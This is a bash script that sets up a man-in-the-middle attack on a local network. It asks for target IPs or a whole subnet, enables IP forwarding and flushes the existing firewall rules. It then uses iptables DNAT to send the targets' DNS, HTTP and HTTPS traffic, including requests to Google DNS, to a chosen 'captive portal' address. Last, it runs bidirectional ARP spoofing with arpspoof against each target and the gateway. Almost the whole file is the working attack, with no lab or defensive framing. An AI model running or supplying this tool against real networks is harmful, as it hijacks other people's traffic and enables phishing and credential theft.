#!/bin/bash

# Install required tools
apt-get install dsniff iptables ipcalc -y

# Prompt user for input
echo "Enter target IP(s) (single IP, multiple IPs separated by commas, or subnet with mask, e.g., 192.168.1.0/24):"
read -p "> " target_input

# Prompt for interface
echo "Enter network interface (e.g., wlan0):"
read -p "> " interface

# Prompt for captive portal IP
echo "Enter captive portal IP (e.g., 192.168.1.10):"
read -p "> " portal_ip

# Prompt for gateway IP
echo "Enter gateway IP (e.g., 192.168.1.1):"
read -p "> " gateway_ip

# Prompt for device IP (to exempt)
echo "Enter device IP to exempt (e.g., 192.168.1.100):"
read -p "> " device_ip

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing iptables rules
iptables -F
iptables -t nat -F

# Function to validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to process IPs
process_ips() {
    local input=$1
    local ip_list=()

    # Check if input is a subnet (contains '/')
    if [[ $input =~ "/" ]]; then
        # Use ipcalc to get IP range and convert to individual IPs
        ip_range=$(ipcalc "$input" | grep HostMin | awk '{print $2}' | head -1)
        ip_max=$(ipcalc "$input" | grep HostMax | awk '{print $2}' | head -1)

        # Convert range to individual IPs
        IFS=. read -r i1 i2 i3 i4 <<< "$ip_range"
        IFS=. read -r j1 j2 j3 j4 <<< "$ip_max"
        
        start=$(( (i1 << 24) + (i2 << 16) + (i3 << 8) + i4 ))
        end=$(( (j1 << 24) + (j2 << 16) + (j3 << 8) + j4 ))

        for ((ip=start; ip<=end; ip++)); do
            ip_addr=$(( (ip >> 24) & 255 )).$(( (ip >> 16) & 255 )).$(( (ip >> 8) & 255 )).$(( ip & 255 ))
            # Skip device IP and gateway IP
            if [ "$ip_addr" != "$device_ip" ] && [ "$ip_addr" != "$gateway_ip" ] && [ "$ip_addr" != "$portal_ip" ]; then
                ip_list+=("$ip_addr")
            fi
        done
    else
        # Handle single or multiple IPs
        IFS=',' read -ra ip_array <<< "$input"
        for ip in "${ip_array[@]}"; do
            ip=$(echo "$ip" | tr -d '[:space:]') # Remove whitespace
            if validate_ip "$ip" && [ "$ip" != "$device_ip" ] && [ "$ip" != "$gateway_ip" ] && [ "$ip" != "$portal_ip" ]; then
                ip_list+=("$ip")
            fi
        done
    fi

    echo "${ip_list[@]}"
}

# Process the target input
target_ips=($(process_ips "$target_input"))

# Check if any valid IPs were found
if [ ${#target_ips[@]} -eq 0 ]; then
    echo "No valid target IPs found or all IPs were exempted."
    exit 1
fi

# Redirect DNS traffic (UDP and TCP) to captive portal
iptables -t nat -I PREROUTING -i "$interface" -p udp --dport 53 -j DNAT --to-destination "$portal_ip"
iptables -t nat -I PREROUTING -i "$interface" -p tcp --dport 53 -j DNAT --to-destination "$portal_ip"

# Redirect hardcoded user DNS (e.g., Google DNS)
iptables -t nat -I PREROUTING -i "$interface" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$portal_ip"
iptables -t nat -I PREROUTING -i "$interface" -p udp -d 8.8.4.4 --dport 53 -j DNAT --to-destination "$portal_ip"

# Allow access to the captive portal
iptables -t nat -I PREROUTING -i "$interface" -d "$portal_ip" -j ACCEPT

# Exempt device IP and gateway IP
iptables -t nat -I PREROUTING -i "$interface" -s "$device_ip" -j ACCEPT
iptables -t nat -I PREROUTING -i "$interface" -d "$device_ip" -j ACCEPT
iptables -t nat -I PREROUTING -i "$interface" -s "$gateway_ip" -j ACCEPT
iptables -t nat -I PREROUTING -i "$interface" -d "$gateway_ip" -j ACCEPT

# Redirect HTTP/HTTPS traffic to captive portal for target IPs
for ip in "${target_ips[@]}"; do
    iptables -t nat -I PREROUTING -i "$interface" -s "$ip" -p tcp --dport 80 -j DNAT --to-destination "$portal_ip"
    iptables -t nat -I PREROUTING -i "$interface" -s "$ip" -p tcp --dport 443 -j DNAT --to-destination "$portal_ip"
done

# Masquerade outgoing traffic
iptables -t nat -I POSTROUTING -o "$interface" -j MASQUERADE

# Start bidirectional ARP spoofing for each target IP
for ip in "${target_ips[@]}"; do
    arpspoof -i "$interface" -t "$ip" "$gateway_ip" &
    arpspoof -i "$interface" -t "$gateway_ip" "$ip" &
done

echo "Captive portal redirection and ARP spoofing started for target IPs."
